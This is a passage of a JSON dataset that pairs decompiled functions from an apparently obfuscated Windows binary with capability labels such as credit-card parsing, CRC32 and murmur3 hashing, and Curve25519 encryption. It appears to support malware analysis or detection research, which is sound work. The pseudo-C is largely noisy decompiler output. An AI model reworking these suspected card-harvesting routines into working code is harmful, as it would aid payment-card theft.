            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403d20(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    int32_t unaff_ESI;\n    bool in_ZF;\n    char in_SF;\n    char in_OF;\n    uint var_4h;\n    \n    if ((!in_ZF && in_OF == in_SF) && (in_ZF || in_OF != in_SF)) {\n        if (in_ECX != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(unaff_ESI + 0x50) = 0;\n        pcVar3 = _sym.imp.USER32.dll_GetMessageA;\n        iVar4 = (*_sym.imp.USER32.dll_GetMessageA)();\n        pcVar2 = _sym.imp.USER32.dll_TranslateMessage;\n        pcVar1 = _sym.imp.USER32.dll_GetDesktopWindow;\n        while (iVar4 != 0) {\n            (*pcVar2)();\n            (*pcVar1)();\n            (*_sym.imp.USER32.dll_DispatchMessageA)(&stack0xffffffe0);\n            iVar4 = (*pcVar3)(&stack0xffffffe0, 0, 0, 0);\n        }\n        return 0;\n    }\n    fcn.00401bd0(0, arg_8h, arg_ch + 1U >> 1);\n    (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar5 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    **(uVar5 + 0x14) = *(uVar5 + 8) + *(uVar5 + 0xc);\n    iVar4 = *(uVar5 - 4);\n    **(uVar5 + 0x10) = *(iVar4 + 0x58);\n    return iVar4;\n}\n",
        "token_count": 462
    },
    "00404f60": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f60(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00404cf0(&var_68h, &var_4h);\n    fcn.00403140(&var_68h, var_4h, 0x4115e8, 0x14000);\n    *arg_8h = 0x4115e8;\n    *arg_ch = 0x14000;\n    return;\n}\n",
        "token_count": 243
    },
    "00401bd0": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401bd0(uint32_t arg_8h, uint16_t *arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        do {\n            arg_8h = arg_8h + *arg_ch;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_ch + 1;\n            arg_10h = arg_10h + -1;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 172
    },
    "00401e60": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f0a) overlaps instruction at (ram,0x00401f05)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.00401e60(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, uint arg_18h)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    char cVar4;\n    int32_t iVar6;\n    uint32_t unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uint *unaff_EDI;\n    bool bVar9;\n    uint auStack32 [2];\n    uint var_8h;\n    uint var_1h;\n    uint8_t uVar5;\n    \n    puVar8 = &var_1h + 1;\n    if (0 < arg_14h) {\n        iVar2 = 1;\n        do {\n            bVar9 = (POPCOUNT((arg_14h ^ unaff_EBX) & 0xff) & 1U) != 0;\n            uVar3 = *(puVar8[-2] + puVar8[4]);\n            if ((bVar9) && (!bVar9)) {\n                puVar7 = auStack32 + 1;\n                cVar4 = '\\x1e';\n                do {\n                    puVar8 = puVar8 + -1;\n                    puVar7 = puVar7 + -1;\n                    *puVar7 = *puVar8;\n                    cVar4 = cVar4 + -1;\n                } while ('\\0' < cVar4);\n                iVar2 = in(0x78);\n                return iVar2;\n            }\n            *(puVar8 + -1) = *(iVar2 % puVar8[3] + puVar8[2]);\n            iVar6 = (iVar2 + -1) % puVar8[3];\n            uVar3 = uVar3 ^ *(iVar6 + puVar8[2]);\n            uVar5 = iVar6;\n            cVar4 = iVar6 >> 8;\n            bVar9 = SCARRY1(uVar5, cVar4);\n            cVar4 = uVar5 + cVar4;\n            if ((cVar4 == '\\0' || bVar9 != cVar4 < '\\0') || (cVar4 != '\\0' && bVar9 == cVar4 < '\\0')) {\n                unaff_EBX = puVar8[5];\n                uVar5 = unaff_EBX * '\\x02';\n            }\n            else {\n                unaff_EBX = ((unaff_EBX >> 8 & 0xffff00) << 8 | unaff_EBX & 0xffff) + 1;\n                puVar1 = puVar8[2] + -0x74c625aa;\n                *puVar1 = *puVar1 ^ uVar3;\n                puVar8 = unaff_EDI;\n            }\n            iVar6 = puVar8[6];\n            *(iVar6 + -1 + iVar2) = uVar5 ^ uVar3;\n            arg_14h = puVar8[-2];\n            *(iVar2 + iVar6) = uVar5 ^ *(puVar8 + -1);\n            arg_14h = arg_14h + 1;\n            puVar8[-2] = arg_14h;\n            iVar2 = iVar2 + 2;\n        } while (arg_14h < unaff_EBX);\n    }\n    return arg_14h;\n}\n",
        "token_count": 793
    },
    "00402ae0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402dd6) overlaps instruction at (ram,0x00402dd2)\n// \n\nvoid fcn.00402ae0(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    int16_t in_AX;\n    int32_t iVar3;\n    uint8_t extraout_CL;\n    char extraout_CH;\n    char extraout_CH_00;\n    int32_t extraout_ECX;\n    int32_t iVar4;\n    uint8_t extraout_DH;\n    int32_t extraout_EDX;\n    int32_t *piVar5;\n    int32_t *piVar6;\n    uint32_t unaff_EBX;\n    uint *unaff_EDI;\n    uint16_t in_SS;\n    uchar uVar7;\n    bool bVar8;\n    char cVar9;\n    char cVar10;\n    unkbyte10 extraout_ST0;\n    uint64_t uVar11;\n    ulong uVar12;\n    uint in_stack_ffffffb8;\n    uint in_stack_ffffffbc;\n    uint in_stack_ffffffc0;\n    uint32_t arg_14h;\n    uint *puVar13;\n    uint in_stack_ffffffd8;\n    int32_t arg_ch;\n    uint in_stack_ffffffdc;\n    int32_t arg_10h;\n    uint uVar14;\n    \n    bVar8 = (POPCOUNT((in_AX + unaff_EBX | 0x11a9U) & 0xff) & 1U) == 0;\n    iVar3 = fcn.00403470(0x407014, 0x14, 0x407028, 0x11);\n    if ((bVar8) || (puVar13 = unaff_EDI,  !bVar8)) {\n        puVar13 = 0xf;\n        in_stack_ffffffdc = 0x407244;\n        in_stack_ffffffd8 = 0x14;\n    }\n    *(iVar3 + 0x14) = *(iVar3 + 0x14) + extraout_CH;\n    fcn.00403470(0x407014, in_stack_ffffffd8, in_stack_ffffffdc, puVar13);\n    fcn.00403470(0x407014, 0x14, 0x407254, 0x1a);\n    fcn.00403470(0x407014, 0x14, 0x4072a8, 10);\n    fcn.00403470(0x407014, 0x14, 0x4072b4, 0xb);\n    fcn.00403470(0x407014, 0x14, 0x4072c0, 8);\n    fcn.00403470(0x407014, 0x14, 0x4072c8, 9);\n    fcn.00403470(0x407014, 0x14, 0x4072d4, 9);\n    fcn.00403470(0x407014, 0x14, 0x4072e0, 9);\n    fcn.00403470(0x407014, 0x14, 0x4072ec, 0xc);\n    fcn.00403470(0x407014, 0x14, 0x4072f8, 3);\n    fcn.00403470(0x407014, 0x14, 0x4072fc, 10);\n    fcn.00403470(0x407014, 0x14, 0x407308, 0x40);\n    fcn.00403470(0x407014, 0x14, 0x407348, 0xc);\n    uVar7 = extraout_DH < extraout_CL;\n    cVar9 = extraout_DH == extraout_CL;\n    do {\n        uVar14 = 0x407014;\n        fcn.00403470(0x407014, 0x14, 0x407354, 0x407014);\n        iVar3 = *0x34a96cf4;\n        if ((uVar7) || (!uVar7)) {\n            arg_14h = 4;\n            arg_10h = 0x407360;\n            arg_ch = 0x14;\n            iVar4 = extraout_ECX;\n            iVar3 = extraout_EDX;\n            goto code_r0x00402d6a;\n        }\n        iVar4 = extraout_ECX + -1;\n    } while (iVar4 != 0 && cVar9 != '\\0');\n    *unaff_EDI = 0x34a96cf8;\n    iVar3 = iVar3 >> 0x1f;\n    uVar2 = *0x9750e2b5 + 0x68;\n    arg_14h = *0x9750e2b5 & 0xffffff00 | uVar2;\n    arg_ch = iVar3;\n    arg_10h = iVar4;\n    if (*0x9750e2b5 < 0x98) {\n        uVar2 = unaff_EBX ^ uVar2;\n    }\n    else {\ncode_r0x00402d6a:\n        pcVar1 = iVar3 + 0x14;\n        cVar9 = iVar4 >> 8;\n        cVar10 = SCARRY1(*pcVar1, cVar9);\n        *pcVar1 = *pcVar1 + cVar9;\n        cVar9 = *pcVar1 < '\\0';\n        uVar11 = fcn.00403470(0x407014, arg_ch, arg_10h, arg_14h);\n        piVar5 = uVar11 >> 0x20;\n        piVar6 = uVar11;\n        if (((cVar10 == cVar9) && (cVar10 != cVar9)) && (piVar5 = piVar6,  0x64680469ffffffff < uVar11)) {\n            arg_14h = unaff_EBX & 0xffff0000 | in_SS;\n            *(unaff_EBX + 0x48) = *(unaff_EBX + 0x48) + 0x27;\n            goto code_r0x00402dd2;\n        }\n        *(piVar5 + 5) = *(piVar5 + 5) + extraout_CH_00;\n        uVar2 = fcn.00403470(0x407014, in_stack_ffffffb8, in_stack_ffffffbc, in_stack_ffffffc0);\n        uVar2 = uVar2 ^ 0xca;\n        arg_14h = unaff_EBX;\n    }\n    cVar10 = '\\0';\n    cVar9 = uVar2 < '\\0';\n    uVar12 = fcn.00403470(0x407014, 0x14, 0x407368, 0xc);\n    piVar6 = uVar12 >> 0x20;\n    if ((cVar10 == cVar9) && (cVar10 != cVar9)) {\n        *(uVar12 + -0x7ce92414) = extraout_ST0;\n    }\n    else {\n        arg_14h = 4;\n    }\ncode_r0x00402dd2:\n    *piVar6 = *piVar6 + 0x46adf84;\n    fcn.00403470(0x407014, 0x14, 0x407374, arg_14h);\n    fcn.00403470(0x407014, 0x14, 0x407378, 9);\n    bVar8 = false;\n    puVar13 = 0x407014;\n    fcn.00403470(0x407014, 0x14, 0x407384, 0x16);\n    if ((!bVar8) && (bVar8)) {\n        *puVar13 = uVar14;\n        return;\n    }\n    fcn.00403470(0x407014, 0x14, 0x40739c, 7);\n    return;\n}\n",
        "token_count": 1792
    },
    "00403140": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004031b3) overlaps instruction at (ram,0x004031b1)\n// \n\nvoid __thiscall fcn.00403140(uint32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    unkbyte3 Var5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint8_t uVar9;\n    char *pcVar10;\n    uchar *puVar11;\n    uint *puVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    int32_t in_stack_00000010;\n    uint32_t uVar4;\n    char cVar8;\n    \n    puVar11 = &stack0xfffffffc;\n    puVar12 = NULL;\n    if (in_stack_00000010 != 0) {\n        do {\n            iVar2 = *(puVar11 + 0x10);\n            pcVar10 = ZEXT48(puVar12) % *(puVar11 + 0xc);\n            iVar6 = *(puVar11 + 8);\n            uVar9 = *(puVar12 + iVar2) ^ pcVar10[iVar6];\n            param_1 = param_1 & 0xffffff00 | uVar9;\n            bVar13 = (POPCOUNT(uVar9) & 1U) == 0;\n            if (bVar13) {\ncode_r0x004031b3:\n                puVar7 = *(puVar11 + 0x14);\n                *(puVar12 + iVar2) = uVar9;\n            }\n            else {\n                if (!bVar13) goto code_r0x004031b3;\n                out(*puVar12, ZEXT48(puVar12) % *(puVar11 + 0xc));\n                do {\n                    cVar8 = iVar6 >> 8;\n                    in_AF = 9 < (iVar6 & 0xf) | in_AF;\n                    Var5 = CONCAT21(iVar6 >> 0x10, cVar8 - in_AF);\n                    iVar6 = CONCAT31(Var5, -in_AF);\n                } while (in_AF || cVar8 == *pcVar10);\n                puVar1 = iVar2 + pcVar10 * 2;\n                uVar3 = *puVar1;\n                uVar4 = *puVar1;\n                *puVar1 = (uVar4 + 0x7b) - in_AF;\n                *(param_1 - 0x75) = iVar6;\n                puVar11 = puVar11 + 1;\n                puVar7 = CONCAT31(Var5, -in_AF + -0x78 + (uVar3 < 0xffffff85 || uVar4 + 0x7b < in_AF)) | 0x3e;\n                puVar12 = puVar12 + 1;\n            }\n            puVar12 = puVar12 + 1;\n        } while (puVar12 < puVar7);\n    }\n    return;\n}\n",
        "token_count": 661
    },
    "00402e90": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403169) overlaps instruction at (ram,0x00403168)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid fcn.00402e90(void)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint64_t uVar4;\n    unkbyte3 Var5;\n    uint8_t uVar6;\n    int32_t iVar7;\n    uint *puVar8;\n    uint8_t extraout_CH;\n    uint8_t extraout_CH_00;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint8_t extraout_CH_01;\n    uint32_t extraout_ECX_02;\n    uint32_t uVar9;\n    char *pcVar10;\n    uint16_t uVar11;\n    uint32_t unaff_EBX;\n    uchar *puVar12;\n    int32_t iVar13;\n    uint unaff_EBP;\n    uint32_t unaff_ESI;\n    uint *puVar14;\n    uint8_t *unaff_EDI;\n    uint8_t *puVar15;\n    uint8_t *puVar16;\n    ushort in_CS;\n    ushort in_SS;\n    bool in_CF;\n    bool bVar17;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar18;\n    char cVar19;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar20;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t uVar21;\n    ulong uVar22;\n    uint8_t uStackY141;\n    uint32_t in_stack_ffffffc3;\n    uint in_stack_ffffffc7;\n    uint in_stack_ffffffcb;\n    uint in_stack_ffffffcf;\n    int32_t iVar23;\n    uint uVar24;\n    uint uStack9;\n    uchar uStack5;\n    uint32_t uVar3;\n    \n    uStack5 = unaff_ESI >> 0x18;\n    uStack9._0_1_ = unaff_EDI >> 0x18;\n    uStack9 = CONCAT31(unaff_ESI, uStack9);\n    if ((!in_CF && !in_ZF) && (in_CF || in_ZF)) {\n        unaff_ESI = unaff_EDI & 0xffffff | uStack9 << 0x18;\n    }\n    fcn.00403470(0x407014, 0x14, 0x4073a4, 0x20);\n    iVar23 = 0x402ede;\n    fcn.00403470(0x407014, 0x14, 0x4073c4, 0x26);\n    uVar21 = unaff_ESI;\n    fcn.00403470(0x407014, 0x14, 0x4073ec, 8);\n    fcn.00403470(0x407014, 0x14, 0x4073f4, 0x19);\n    fcn.00403470(0x407014, 0x14, 0x407410, 0xb);\n    fcn.00403470(0x407014, 0x14, 0x40741c, 0x12);\n    bVar18 = (extraout_CH ^ unaff_EBX) < '\\0';\n    uVar24 = 0x402f90;\n    uVar22 = fcn.00403470(0x407014, 0x14, 0x407430, 0x12);\n    if ((bVar18) || (!bVar18)) {\n        uVar24 = 2;\n        unaff_EBP = 0x407444;\n        uVar21 = 0x14;\n    }\n    else {\n        bVar18 = 0xbb97fd95 < uVar22;\n        iVar7 = uVar22 + 0x4468026a;\n        if (iVar7 == 0) goto code_r0x00402fe4;\n    }\n    puVar15 = (uVar22 >> 0x20) + 0x14;\n    bVar18 = CARRY1(*puVar15, extraout_CH_00);\n    *puVar15 = *puVar15 + extraout_CH_00;\n    uVar22 = fcn.00403470(0x407014, uVar21, unaff_EBP, uVar24);\n    iVar7 = uVar22 >> 0x20;\n    uVar6 = extraout_ECX >> 8;\n    if ((bVar18) || (!bVar18)) {\n        iVar23 = 8;\n        in_stack_ffffffcf = 0x407448;\n        in_stack_ffffffcb = 0x14;\n        goto code_r0x00402fd0;\n    }\n    bVar18 = bVar18 == false;\n    uVar24 = extraout_ECX;\n    iVar23 = iVar7;\n    do {\n        iVar7 = uVar22 >> 0x20;\n        *(unaff_ESI + 0x43d1773a) = *(unaff_ESI + 0x43d1773a) ^ 0x6a27e95e;\n        puVar15 = uVar22 + bVar18 + 0x7c8ecb55;\n        uVar6 = uVar24 >> 8;\n        *puVar15 = *puVar15 | uVar6;\n        if (*puVar15 != 0) {\ncode_r0x00402fd0:\n            puVar15 = iVar7 + 0x14;\n            bVar18 = CARRY1(*puVar15, uVar6);\n            *puVar15 = *puVar15 + uVar6;\n            in_stack_ffffffc7 = 0x407014;\n            iVar7 = fcn.00403470(0x407014, in_stack_ffffffcb, in_stack_ffffffcf, iVar23);\n            in_stack_ffffffc3 = unaff_ESI;\n            if (!bVar18) {\ncode_r0x00402fe4:\n                unaff_ESI = in_stack_ffffffc3;\n                if (bVar18) {\n                    out(0xbd, iVar7);\n                    return;\n                }\n            }\n        }\n        fcn.00403470(0x407014, 0x14, 0x407450, 8);\n        bVar18 = 0xffffffbf < &stack0xffffffb7;\n        bVar17 = (POPCOUNT(&stack0xfffffff7 & 0xff) & 1U) == 0;\n        puVar15 = unaff_EDI;\n        if (bVar17) goto code_r0x00403035;\n        if (!bVar17) goto code_r0x00403035;\n        puVar14 = segment(in_SS, *0x10 + -9);\n        uVar22 = CONCAT44(0xb7bc9ea5, *puVar14);\n        if (bVar18) {\n            puVar15 = unaff_EDI + 1;\n            *unaff_EDI = *puVar14;\n            uVar24 = extraout_ECX_00;\n            goto code_r0x0040305a;\n        }\n        uVar24 = extraout_ECX_00;\n    } while (bVar17);\n    do {\n        uStack9 = 0xb7bc9ea5;\ncode_r0x00403035:\n        fcn.00403470(0x407014, 0x14, 0x407458, 6);\n        uVar24 = extraout_ECX_01;\ncode_r0x0040305a:\n        bVar18 = false;\n        bVar17 = (POPCOUNT(uVar24 - 5U & 0x44) & 1U) == 0;\n        uVar11 = 0;\n        fcn.00403470(0x407014, 0x14, 0x407460, 7);\n        if ((bVar17) || (!bVar17)) break;\n        segment(in_SS, *0x10 + -0x19);\n        if (bVar18) goto code_r0x004030c8;\n    } while (bVar17);\n    fcn.00403470(0x407014, 0x14, 0x407468, 7);\n    uVar11 = unaff_EBX;\n    unaff_EBX = unaff_EBX & 0xffff0000;\ncode_r0x004030c8:\n    uVar6 = fcn.00403470(0x407014, 0x14, 0x407470, 6);\n    cVar19 = uVar6 - *puVar15;\n    uVar21 = (in_NT & 1) * 0x4000 | SBORROW1(uVar6, *puVar15) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n             (cVar19 < '\\0') * 0x80 | (cVar19 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar19) & 1U) == 0) * 4\n             | uVar6 < *puVar15 | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n             (in_AC & 1) * 0x40000;\n    iVar23 = func_0x10189067();\n    bVar18 = false;\n    bVar17 = (*(iVar23 + -0x7f + (unaff_EBX & 0xffff0000 | uVar11)) & 0x4b) == 0;\n    uVar24 = 0x403108;\n    uVar22 = fcn.00403470(0x407014, 0x14, 0x407478, uVar21);\n    iVar23 = uVar22;\n    if ((bVar18 || bVar17) || (!bVar18 && !bVar17)) {\n        uVar24 = 8;\n        in_stack_ffffffcb = 0x4074a0;\n        in_stack_ffffffc7 = 0x14;\n    }\n    else {\n        puVar16 = puVar15 + 5;\n        puVar14 = unaff_ESI + 3;\n        *(puVar15 + 1) = *(unaff_ESI - 1);\n        uVar21 = unaff_EBX & 0xffff0000 | CONCAT11(0xdf, uVar11);\n        iVar7 = 0x6ae181d0;\n        cVar20 = '\\0';\n        cVar19 = (uStackY141 | extraout_CH_01) < '\\0';\n        if ((uStackY141 | extraout_CH_01) == 0) {\n            *(iVar23 + -2) = in_CS;\n            puVar12 = iVar23 + -6;\n            *(iVar23 + -6) = 0x40316b;\n            puVar8 = (*(puVar15 + -0x70))();\n            uVar9 = extraout_ECX_02;\n            if (cVar20 == cVar19) {\n                return;\n            }\n            do {\n                uVar6 = *(puVar14 + puVar16);\n                *(puVar12 + -4) = uVar21;\n                *(puVar12 + -6) = puVar8;\n                uVar21 = *(puVar12 + -4);\n                uVar4 = ZEXT48(puVar14) % *(iVar7 + 0xc);\n                pcVar10 = uVar4;\n                iVar23 = *(iVar7 + 8);\n                uVar6 = uVar6 ^ pcVar10[iVar23];\n                uVar9 = uVar9 & 0xffffff00 | uVar6;\n                bVar18 = (POPCOUNT(uVar6) & 1U) == 0;\n                if (bVar18) {\ncode_r0x004031b3:\n                    puVar8 = *(iVar7 + 0x14);\n                    *(puVar14 + puVar16) = uVar6;\n                }\n                else {\n                    *(puVar12 + -2) = puVar14;\n                    puVar8 = puVar14 & 0xffff0000 | *(puVar12 + -2);\n                    puVar14 = puVar8;\n                    if (!bVar18) goto code_r0x004031b3;\n                    puVar14 = puVar8 + 1;\n                    out(*puVar8, uVar4);\n                    do {\n                        cVar19 = iVar23 >> 8;\n                        in_AF = 9 < (iVar23 & 0xf) | in_AF;\n                        Var5 = CONCAT21(iVar23 >> 0x10, cVar19 - in_AF);\n                        iVar13 = *puVar12;\n                        puVar12 = iVar13 + 4;\n                        iVar23 = CONCAT31(Var5, -in_AF);\n                    } while (in_AF || cVar19 == *pcVar10);\n                    puVar1 = puVar16 + pcVar10 * 2;\n                    uVar2 = *puVar1;\n                    uVar3 = *puVar1;\n                    *puVar1 = (uVar3 + 0x7b) - in_AF;\n                    *(uVar9 - 0x75) = iVar23;\n                    iVar7 = iVar7 + 1;\n                    puVar8 = CONCAT31(Var5, -in_AF + -0x78 + (uVar2 < 0xffffff85 || uVar3 + 0x7b < in_AF)) | 0x3e;\n                    puVar12 = iVar13 + 4;\n                }\n                puVar14 = puVar14 + 1;\n                if (puVar8 <= puVar14) {\n                    return;\n                }\n                *(puVar12 + -4) = puVar16;\n                puVar16 = *(iVar7 + 0x10);\n            } while( true );\n        }\n    }\n    pcVar10 = (uVar22 >> 0x20) + 0x14;\n    *pcVar10 = *pcVar10 + extraout_CH_01;\n    fcn.00403470(0x407014, in_stack_ffffffc7, in_stack_ffffffcb, uVar24);\n    return;\n}\n",
        "token_count": 3225
    },
    "00404cf0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404f0b) overlaps instruction at (ram,0x00404f07)\n// \n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Removing unreachable block (ram,0x00404e4b)\n// WARNING: Removing unreachable block (ram,0x00404dc4)\n// WARNING: Removing unreachable block (ram,0x00404f40)\n\nuint32_t __fastcall fcn.00404cf0(uint32_t param_1, int32_t param_2, uchar *param_3)\n\n{\n    char cVar1;\n    uint32_t **ppuVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint16_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint16_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t *puVar12;\n    uint uVar13;\n    uint unaff_EBX;\n    uint uVar14;\n    uint uVar15;\n    uint32_t **ppuVar16;\n    uint32_t *puVar17;\n    uint32_t **ppuVar18;\n    uint *puVar19;\n    uint *puVar20;\n    uint32_t *puVar21;\n    int32_t iVar22;\n    uint *puVar23;\n    int32_t iVar24;\n    uint uVar25;\n    int32_t unaff_EDI;\n    uint32_t *puVar26;\n    char *pcVar27;\n    uint uVar28;\n    ushort in_ES;\n    bool bVar29;\n    bool bVar30;\n    uint8_t in_AF;\n    bool bVar31;\n    bool bVar32;\n    float10 in_ST0;\n    float10 in_ST1;\n    ushort uStack22;\n    ushort uStack20;\n    uint16_t uStack18;\n    \n    uStack22 = param_1 >> 0x10;\n    bVar29 = (POPCOUNT(param_2 >> 8 & 0x12) & 1U) == 0;\n    *param_3 = 0xca;\n    if (bVar29) {\ncode_r0x00404d1b:\n        param_3[1] = 0x3d;\n        uStack18 = param_1;\n        uStack22 = unaff_EBX;\n        uStack20 = unaff_EBX >> 0x10;\n    }\n    else {\n        uStack20 = unaff_EDI;\n        uStack18 = unaff_EDI >> 0x10;\n        if (!bVar29) goto code_r0x00404d1b;\n    }\n    iVar22 = *0xc617b43a;\n    uVar6 = param_2 + 2;\n    *0x56535166 = *0x56535166 + unaff_EDI;\n    bVar29 = 0x34a97eff < param_3;\n    uVar9 = 0x34a97eff - param_3;\n    bVar32 = uVar9 < 0;\n    bVar31 = uVar9 == 0;\n    bVar30 = (POPCOUNT(uVar9 & 0xff) & 1U) == 0;\n    *(param_2 + 4) = 0xb0;\n    if ((bVar30) || (!bVar30)) {\n        *(param_2 + 5) = 0x60;\n        if (!bVar29 && !bVar31) goto code_r0x00404d61;\n    }\n    else {\n        bVar29 = false;\n        uVar3 = uVar6 | 0x66;\n        uVar6 = uVar6 | 0x66;\n        bVar32 = uVar3 < '\\0';\n        bVar31 = uVar3 == 0;\ncode_r0x00404d61:\n        if (bVar29 || bVar31) {\n            uVar6 = uVar6 & 0xe2f4cc58;\n            bVar32 = uVar6 < 0;\n        }\n    }\n    *(uVar6 + 4) = 0xea;\n    if ((!bVar32) && (bVar32)) {\n        *(unaff_EDI + 0x1c) = in_ST0;\n        in_ST0 = in_ST1;\n    }\n    *(uVar6 + 5) = 0x6c;\n    iVar24 = *(iVar22 + 8);\n    *(iVar24 + 6) = 0xb5;\n    *(iVar24 + 7) = 0xdd;\n    *(iVar24 + 8) = 7;\n    *(iVar24 + 9) = 0x95;\n    uVar9 = param_1 & 0xffff0000 | uStack18 & 0xff | (uStack18 >> 8) - uStack22 << 8;\n    ppuVar16 = &stack0xfffffff0 ^ *(CONCAT22(uStack20, uStack22) + -0x3a);\n    puVar26 = iVar22 + -0x3c0899a0;\n    *puVar26 = *puVar26 | param_3;\n    bVar31 = SBORROW4(uVar9, param_3);\n    uVar9 = uVar9 - param_3;\n    bVar30 = uVar9 < 0;\n    bVar29 = (POPCOUNT(uVar9 & 0xff) & 1U) == 0;\n    puVar26 = *ppuVar16;\n    puVar23 = ppuVar16[2];\n    uVar14 = ppuVar16[4];\n    uVar11 = ppuVar16[5];\n    uVar10 = ppuVar16[6];\n    uVar7 = ppuVar16[7];\n    uVar9 = puVar23[2];\n    *(uVar9 + 10) = 0xf8;\n    ppuVar18 = ppuVar16 + 8;\n    uVar6 = uVar9;\n    if ((bVar29) || (ppuVar18 = ppuVar16 + 8,  !bVar29)) {\ncode_r0x00404e27:\n        *(uVar6 + 0xb) = 0x1c;\n        if (bVar31 == bVar30) {\n            *(ppuVar18 + -4) = puVar26;\n            puVar26 = *(ppuVar18 + -4);\n            if (bVar31 != bVar30) {\n                *ppuVar18 = in_ES;\n                uVar6 = uVar6 - 1;\n                pcVar27 = puVar26 | puVar23;\n                puVar26 = pcVar27 + 1;\n                *pcVar27 = uVar7;\n                uVar11 = uVar11 & 0xffffff00;\n                uVar5 = uVar7 + (uVar7 >> 8) * 'y';\n                uVar7 = uVar7 & 0xffff0000 | uVar5;\n                bVar29 = (POPCOUNT(uVar5) & 1U) == 0;\n            }\n        }\n        *(uVar6 + 0xc) = 0x74;\n        if (bVar29) {\ncode_r0x00404e61:\n            *(uVar6 + 0xd) = 0x11;\n            *(ppuVar18 + -4) = uVar10;\n            puVar17 = ppuVar18 + -8;\n            ppuVar18 = ppuVar18 + -8;\n            *puVar17 = uVar11;\n            uVar9 = uVar7;\n        }\n        else {\n            *(ppuVar18 + -4) = puVar26;\n            puVar26 = *(ppuVar18 + -4);\n            if (!bVar29) goto code_r0x00404e61;\n            puVar23 = *0xc617b43a;\n            uVar6 = 0x34a96cf5;\n            uVar9 = uVar11 + 1 | 0x66525111;\n            uVar11 = uVar7;\n        }\n        bVar29 = (POPCOUNT(uVar11 ^ uVar14 >> 8 | 0x67) & 1U) == 0;\n        uVar11 = *ppuVar18;\n        uVar10 = ppuVar18[1];\n        puVar21 = ppuVar18 + 2;\n        *(uVar6 + 0xe) = 0x7f;\n        ppuVar2 = ppuVar18 + 2;\n        if (bVar29) goto code_r0x00404e94;\n    }\n    else {\n        uVar6 = *puVar26;\n        *puVar26 = uVar9;\n        ppuVar18 = ppuVar16 + 9;\n        puVar23 = puVar23 - *(puVar23 + 0x5f9dff63);\n        if (puVar23 < 0) {\n            return uVar7;\n        }\n        bVar31 = false;\n        bVar30 = uVar6 < 0;\n        bVar29 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n        uVar9 = uVar7;\n        ppuVar2 = ppuVar16 + 9;\n        if (bVar30) goto code_r0x00404e27;\n    }\n    puVar21 = ppuVar2;\n    if (bVar29) {\n        puVar19 = puVar21 + -4;\n        *(puVar21 + 